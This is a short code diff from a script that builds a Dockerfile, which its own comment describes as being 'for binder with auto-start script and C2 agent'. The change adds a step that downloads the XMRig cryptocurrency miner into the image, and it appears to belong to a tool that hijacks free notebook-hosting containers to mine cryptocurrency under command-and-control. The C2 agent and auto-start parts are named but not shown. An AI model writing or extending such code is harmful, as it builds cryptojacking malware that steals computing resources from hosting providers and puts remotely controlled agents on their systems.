@@ -276,11 +276,10 @@ Time: {datetime.now().isoformat()}
             # Create Dockerfile for binder with auto-start script and C2 agent
             dockerfile = f"""FROM alpine:3.19 AS builder
 
-# Download and extract XMRig in Alpine
-RUN apk add --no-cache wget tar && \
-    wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && \
-    tar -xzf xmrig-6.21.0-linux-static-x64.tar.gz && \
-    mv xmrig-6.21.0-linux-static-x64/xmrig /xmrig
+# Download and extract XMRig using ADD
+ADD https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz /tmp/
+RUN tar -xzf /tmp/xmrig-6.21.0-linux-static-x64.tar.gz -C /tmp && \
+    mv /tmp/xmrig-6.21.0-linux-static-x64/xmrig /xmrig
 
 FROM python:3.10-slim
 
